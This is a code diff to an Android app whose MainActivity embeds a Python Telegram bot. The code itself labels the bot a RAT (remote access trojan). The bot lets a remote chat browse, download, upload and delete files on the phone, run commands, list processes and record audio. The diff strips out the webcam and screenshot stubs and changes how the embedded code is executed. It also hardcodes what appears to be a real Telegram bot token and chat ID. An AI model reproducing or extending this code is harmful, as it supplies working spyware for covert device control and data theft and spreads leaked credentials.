@@ -3,7 +3,6 @@ package com.example.myapp;
 import android.Manifest;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
-import android.os.Environment;
 import android.view.View;
 import android.widget.Button;
 import android.widget.LinearLayout;
@@ -11,11 +10,8 @@ import android.widget.TextView;
 import android.widget.Toast;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
-import com.chaquo.python.PyObject;
 import com.chaquo.python.Python;
 import com.chaquo.python.android.AndroidPlatform;
-import java.io.File;
-import java.io.FileWriter;
 
 public class MainActivity extends AppCompatActivity {
     private static final int REQUEST_PERMISSIONS = 1;
@@ -27,20 +23,11 @@ public class MainActivity extends AppCompatActivity {
         + "import shutil\n"
         + "import subprocess\n"
         + "from datetime import datetime\n"
-        + "from jnius import autoclass\n"
         + "import uuid\n"
-        + "import base64\n"
         + "from cryptography.fernet import Fernet\n"
         + "\n"
-        + "# Android API\n"
-        + "Context = autoclass('android.content.Context')\n"
-        + "Activity = autoclass('org.chaquo.python.PythonActivity')\n"
-        + "activity = Activity.mActivity\n"
-        + "Environment = autoclass('android.os.Environment')\n"
-        + "MediaRecorder = autoclass('android.media.MediaRecorder')\n"
-        + "\n"
         + "# Настройка бота\n"
-        + "TELEGRAM_TOKEN = '8140904992:AAHwIgINyH8xV5JluJ_KiFrKzlAEw48wXG8'  # Замените на ваш токе\n"
+        + "TELEGRAM_TOKEN = '8140904992:AAHwIgINyH8xV5JluJ_KiFrKzlAEw48wXG8'  # Замените на ваш токен\n"
         + "ALLOWED_CHAT_ID = '5934507030'  # Замените на ваш ID\n"
         + "bot = telebot.AsyncTeleBot(TELEGRAM_TOKEN)\n"
         + "\n"
@@ -49,7 +36,7 @@ public class MainActivity extends AppCompatActivity {
         + "cipher = Fernet(key)\n"
         + "\n"
         + "# Временная папка\n"
-        + "TEMP_DIR = Environment.getExternalStorageDirectory().getAbsolutePath() + '/RAT_TEMP'\n"
+        + "TEMP_DIR = '/sdcard/RAT_TEMP'\n"
         + "os.makedirs(TEMP_DIR, exist_ok=True)\n"
         + "\n"
         + "# Состояния\n"
@@ -60,8 +47,7 @@ public class MainActivity extends AppCompatActivity {
         + "main_menu = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)\n"
         + "main_menu.add('/Disks', '/CD', '/ls')\n"
         + "main_menu.add('/Download', '/Remove')\n"
-        + "main_menu.add('/Screen', '/Webcam', '/Audio')\n"
-        + "main_menu.add('/Run', '/Processes', '/Upload')\n"
+        + "main_menu.add('/Audio', '/Run', '/Processes', '/Upload')\n"
         + "\n"
         + "# Декоратор для ограничения доступа\n"
         + "def restricted(func):\n"
@@ -108,7 +94,7 @@ public class MainActivity extends AppCompatActivity {
         + "@restricted\n"
         + "async def disks(message):\n"
         + "    try:\n"
-        + "        storage_dir = Environment.getExternalStorageDirectory().getAbsolutePath()\n"
+        + "        storage_dir = '/sdcard'\n"
         + "        await bot.reply_to(message, f'Доступный диск: ```\\n{storage_dir}\\n```', parse_mode='Markdown')\n"
         + "    except Exception as e:\n"
         + "        await bot.reply_to(message, f'Ошибка: {e}')\n"
@@ -177,23 +163,6 @@ public class MainActivity extends AppCompatActivity {
         + "        elif os.path.isdir(file_path):\n"
         + "            shutil.rmtree(file_path)\n"
         + "            await bot.reply_to(message, f'Папка удалена: {file_name}')\n"
-        + "    except Exception as e:\n"
-        + "        await bot.reply_to(message, f'Ошибка: {e}')\n"
-        + "    await cleanup_temp()\n"
-        + "\n"
-        + "# Скриншот (заглушка, реализация через Java)\n"
-        + "@bot.message_handler(commands=['Screen'])\n"
-        + "@restricted\n"
-        + "async def screen(message):\n"
-        + "    await bot.reply_to(message, 'Скриншот пока не поддерживается. Используйте команду в Telegram после согласия.')\n"
-        + "\n"
-        + "# Веб-камера (заглушка, реализация через Java)\n"
-        + "@bot.message_handler(commands=['Webcam'])\n"
-        + "@restricted\n"
-        + "async def webcam(message):\n"
-        + "    try:\n"
-        + "        await bot.send_chat_action(message.chat.id, 'upload_photo')\n"
-        + "        await bot.reply_to(message, 'Фото с веб-камеры отправлено из Java.')\n"
         + "    except Exception as e:\n"
         + "        await bot.reply_to(message, f'Ошибка: {e}')\n"
         + "    await cleanup_temp()\n"
@@ -305,30 +274,20 @@ public class MainActivity extends AppCompatActivity {
             Python.start(new AndroidPlatform(this));
         }
 
-        // Запись Python-кода во временный файл
-        try {
-            File pyFile = new File(getFilesDir(), "bot.py");
-            FileWriter writer = new FileWriter(pyFile);
-            writer.write(PYTHON_CODE);
-            writer.close();
-        } catch (Exception e) {
-            Toast.makeText(this, "Ошибка записи Python-кода: " + e.getMessage(), Toast.LENGTH_LONG).show();
-            return;
-        }
-
-        // Обработчик кнопки согласия
+        // Запуск Python-кода
         consentButton.setOnClickListener(v -> {
             if (checkPermissions()) {
-                Python py = Python.getInstance();
-                py.getModule("bot").callAttr("start_bot");
-                Toast.makeText(this, "Согласие получено, бот запущен!", Toast.LENGTH_SHORT).show();
+                try {
+                    Python py = Python.getInstance();
+                    py.getModule("python").callAttr("exec", PYTHON_CODE);
+                    Toast.makeText(this, "Согласие получено, бот запущен!", Toast.LENGTH_SHORT).show();
+                } catch (Exception e) {
+                    Toast.makeText(this, "Ошибка Python: " + e.getMessage(), Toast.LENGTH_LONG).show();
+                }
             } else {
                 requestPermissions();
             }
         });
-
-        // Запрос разрешений
-        requestPermissions();
     }
 
     private boolean checkPermissions() {
@@ -336,8 +295,7 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.INTERNET,
             Manifest.permission.WRITE_EXTERNAL_STORAGE,
             Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.CAMERA
+            Manifest.permission.RECORD_AUDIO
         };
         for (String permission : permissions) {
             if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
@@ -352,8 +310,7 @@ public class MainActivity extends AppCompatActivity {
             Manifest.permission.INTERNET,
             Manifest.permission.WRITE_EXTERNAL_STORAGE,
             Manifest.permission.READ_EXTERNAL_STORAGE,
-            Manifest.permission.RECORD_AUDIO,
-            Manifest.permission.CAMERA
+            Manifest.permission.RECORD_AUDIO
         }, REQUEST_PERMISSIONS);
     }
 
@@ -361,9 +318,13 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == REQUEST_PERMISSIONS && grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            Python py = Python.getInstance();
-            py.getModule("bot").callAttr("start_bot");
-            Toast.makeText(this, "Разрешения получены, бот запущен!", Toast.LENGTH_SHORT).show();
+            try {
+                Python py = Python.getInstance();
+                py.getModule("python").callAttr("exec", PYTHON_CODE);
+                Toast.makeText(this, "Разрешения получены, бот запущен!", Toast.LENGTH_SHORT).show();
+            } catch (Exception e) {
+                Toast.makeText(this, "Ошибка Python: " + e.getMessage(), Toast.LENGTH_LONG).show();
+            }
         } else {
             Toast.makeText(this, "Разрешения отклонены!", Toast.LENGTH_SHORT).show();
         }
